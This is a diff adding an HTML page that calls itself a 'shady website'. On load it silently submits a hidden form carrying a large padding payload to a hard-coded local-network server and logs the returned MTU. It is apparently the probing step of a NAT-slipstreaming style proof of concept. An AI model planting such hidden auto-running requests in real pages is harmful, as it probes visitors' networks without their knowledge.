@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+</head>
+<body>
+    <h1>Welcome to my shady website</h1>
+    <form id="mtu_getter" action="http://192.168.5.185:9090" method="post" enctype="multipart/form-data" style="display:none;">
+        <input type="hidden" name="payload">
+    </form>
+    <script>
+        let mtu
+
+        window.addEventListener('load', run)
+
+        async function run() {
+            mtu = await getMtu()
+        }
+
+        async function getMtu() {
+            let mtu_form = document.forms['mtu_getter']
+            mtu_form.payload.value = strRepeat('0123456789ABCDEFGHIJ', 8000)
+            let res = await postForm(mtu_form)
+            console.log('MTU: ' + res.mtu)
+            return res.mtu
+        }
+
+        function postForm(form) {
+            return new Promise(function (resolve, reject) {
+                var xmlHttp = new XMLHttpRequest();
+                xmlHttp.onreadystatechange = function () {
+                    if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+                        resolve(JSON.parse(xmlHttp.responseText))
+                    }
+                }
+                xmlHttp.open("POST", form.action)
+                xmlHttp.send(new FormData(form))
+            })
+        }
+
+        function strRepeat(str, iter) {
+            let original = str
+            for (var i = 0; i < iter; i++) {
+                str += original
+            }
+            return str
+        }
+    </script>
+</body>
+</html>
